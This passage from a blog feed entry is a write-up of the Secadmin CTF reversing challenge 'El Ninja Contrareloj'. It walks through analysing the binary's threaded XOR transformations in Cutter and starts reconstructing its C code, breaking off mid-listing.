      <published>2018-10-08T14:02:44+02:00</published>
      <updated>2018-10-08T14:02:44+02:00</updated>
      <id>http://localhost:4000/2018/10/08/secadmin-reversing-writeup</id>
      <content type="html" xml:base="http://localhost:4000/2018/10/08/secadmin-reversing-writeup/">&lt;p&gt;Last week, &lt;a href=&quot;https://www.secadmin.es/&quot;&gt;Secadmin&lt;/a&gt; conference was held with some easy CTF challenges about crypto, web and reversing. This write-ups is for “El Ninja Contrareloj” challenge, a reversing one.&lt;/p&gt;

&lt;p&gt;The challenge has a long statement, in summary, they let you a binary and you need to reverse it to obtain the flag. Go go go go!&lt;/p&gt;

&lt;p&gt;First is first, execute the binary and see what it does. When executing, it ask you for the flag, then wait some time and then, if wrong (obviosly, the first try will be wrong), the program tells you need some “Cruzcampo” (possibly the worst Spanish beer ever).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/execute.png&quot; alt=&quot;execute&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; to the binary outputs that binary is not stripped, so functions and some variable names will remain, cool for our purpose.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ file secadmin_ctf

secadmin_ctf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, 
BuildID[sha1]=460f36a3556ccc50b9befcd63b15de8fccb1b34f, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;binary-analysis-using-cutter&quot;&gt;Binary analysis, using Cutter!&lt;/h4&gt;

&lt;p&gt;This time I’ll not use IDA to analyse the binary, let’s use &lt;a href=&quot;https://github.com/radareorg/cutter&quot;&gt;Cutter&lt;/a&gt;, a QT based multiplatform GUI for &lt;a href=&quot;https://rada.re/r/&quot;&gt;radare2&lt;/a&gt;, really cool project started by the great Hugo Teso as &lt;a href=&quot;https://github.com/hteso/iaito&quot;&gt;Iato&lt;/a&gt; and currently mantained (as Cutter) by a lot of great radare2 community people.&lt;/p&gt;

&lt;p&gt;Opening the binary using Cutter, shows us at first some useful information about the binary compilation flags.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/dashboard.png&quot; alt=&quot;dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Not really so much information as the &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command, but adds some information useful from an exploting perspective, such as Canary stack protection, NX bit, PIE and RELRO flags.&lt;/p&gt;

&lt;p&gt;Well, the next step is review the binary functions, as this binary is not stripped, function names remain and it’s easier for us to identify each one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/functions.png&quot; alt=&quot;functions&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Starting from &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function, let’s see what it does. As I previosly executed the binary to see the execution flow, it’s expected to see some header print, then print “Introduce tu flag…”, and gets the user STDIN input, and then process that input. This last “process” is the interesting part.&lt;/p&gt;

&lt;p&gt;Here’s the dissembly of the interesting part:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/main.png&quot; alt=&quot;main&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok, as you can see, &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.flag&lt;/code&gt; is the variable where the user input will be stored using &lt;code class=&quot;highlighter-rouge&quot;&gt;scanf&lt;/code&gt; (yep, there’s a stack buffer overflow here). Then, “Espere unos instantes” message is displayed and &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.flag&lt;/code&gt; is stored on an auxiliar variable &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.msg&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Here comes the interesting part, three functions are called on different threads using the &lt;code class=&quot;highlighter-rouge&quot;&gt;pthread_create&lt;/code&gt; C function. This function calls another function and its parameters and execute it on a new thread. Debug threads using raw GDB can be a headache.&lt;/p&gt;

&lt;p&gt;At the end, it compares the &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.s&lt;/code&gt; global string with &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.j&lt;/code&gt; global string, so it’s expected that our initial string is going to be transformed and stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.j&lt;/code&gt; and then compared with the transformed flag, stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.s&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Taking a look to &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.s&lt;/code&gt; global variable, we can see it’s initialized with 22 bytes. To do this, just double click over any &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.s&lt;/code&gt; reference, and then, select the “Hexdump” tab.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/s_hex.png&quot; alt=&quot;s&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Seems like we need to input something that end up beeing like &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.s&lt;/code&gt; bytes, so first hint, our input needs to be 22 bytes long, and probably starting with the flag format &lt;code class=&quot;highlighter-rouge&quot;&gt;secadmin{&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s first analyze the &lt;code class=&quot;highlighter-rouge&quot;&gt;sym.timer&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;sym.tr1&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;sym.tr2&lt;/code&gt; functions, and see what they do.&lt;/p&gt;

&lt;h4 id=&quot;timer-function&quot;&gt;“timer” function&lt;/h4&gt;

&lt;p&gt;Let’s analyze first, the &lt;code class=&quot;highlighter-rouge&quot;&gt;sym.timer&lt;/code&gt; function, which is the first function called.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/timer.png&quot; alt=&quot;timer&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This function basically loops indefinitely, increasing the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.tiempo&lt;/code&gt; variable by one each time, but before this, it calls &lt;code class=&quot;highlighter-rouge&quot;&gt;usleep&lt;/code&gt; C function, passing it &lt;code class=&quot;highlighter-rouge&quot;&gt;0xf4240&lt;/code&gt; as parameter. If you don’t know, usleep function will sleep the thread N microseconds. &lt;code class=&quot;highlighter-rouge&quot;&gt;0xf4240&lt;/code&gt; is the hex representation of the decimal &lt;code class=&quot;highlighter-rouge&quot;&gt;1000000&lt;/code&gt;, which in seconds is 1 second.&lt;/p&gt;

&lt;p&gt;So this function, increase the value of the global variable &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.tiempo&lt;/code&gt; by one each one second.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;timer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 second&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tiempo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;tr1-function&quot;&gt;“tr1” function&lt;/h4&gt;

&lt;p&gt;Then, let’s analyze first, the &lt;code class=&quot;highlighter-rouge&quot;&gt;sym.tr1&lt;/code&gt; function, which is the second function called.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/tr1.png&quot; alt=&quot;tr1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Easy flow here, first, the length of &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.msg&lt;/code&gt; (which is our input) is calculated, and we iterate from &lt;code class=&quot;highlighter-rouge&quot;&gt;i=0&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;i&amp;lt;strlen(obj.msg)&lt;/code&gt;. Inside the for loop, the application xors each byte of the user input string, with it’s user input length and stores the result on another global variable &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.j&lt;/code&gt;. Then sleeps &lt;code class=&quot;highlighter-rouge&quot;&gt;0x30d40&lt;/code&gt; microseconds, wich in decimal seconds corresponds with 0.2 seconds.&lt;/p&gt;

&lt;p&gt;The C code will look like the following:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0.2 segundos&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;tr2-function&quot;&gt;“tr2” function&lt;/h4&gt;
&lt;p&gt;Last function called is tr2, let’s see what this function does.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/secadmin/tr2.png&quot; alt=&quot;tr2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uuuh, really similar to the tr1 function right? This function also calculates the strlen of the user input and iterate from 0 to user input string length too. But this time the xor formula changes and it sleeps 0.4 seconds insted of 0.2.&lt;/p&gt;

&lt;p&gt;This time, this function does not take the user input as a xor parameter, it uses &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.j&lt;/code&gt; instead, xored with a &lt;code class=&quot;highlighter-rouge&quot;&gt;obj.t&lt;/code&gt; array and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x80&lt;/code&gt;, the xor formula pseudocode is as follows:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tiempo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you remember, &lt;code class=&quot;highlighter-rouge&quot;&gt;j&lt;/code&gt; is a global variable where &lt;code class=&quot;highlighter-rouge&quot;&gt;tr1&lt;/code&gt; will write the result of its xor function, then &lt;code class=&quot;highlighter-rouge&quot;&gt;tiempo&lt;/code&gt; is another global variable wich will increase by one each second. As &lt;code class=&quot;highlighter-rouge&quot;&gt;tr1&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;tr2&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;timer&lt;/code&gt; functions are in different threads, this values will increase asynchronously.&lt;/p&gt;

&lt;h4 id=&quot;solving-the-equations&quot;&gt;Solving the equations.&lt;/h4&gt;

&lt;p&gt;Been this a short program, we can reconstruct it’s C code, to avoid dealing with GDB debugging over threads and time dependant variables, it’s easier for me to do it this way.&lt;/p&gt;

&lt;p&gt;Here’s the C code:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tiempo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x91&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x87&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xEE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x9c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xbf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x93&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x96&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xde&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xDE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2C&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x66&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x67&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;secadmin{AAAAAAAAAAAA}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;timer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;usleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 segundo&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tiempo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
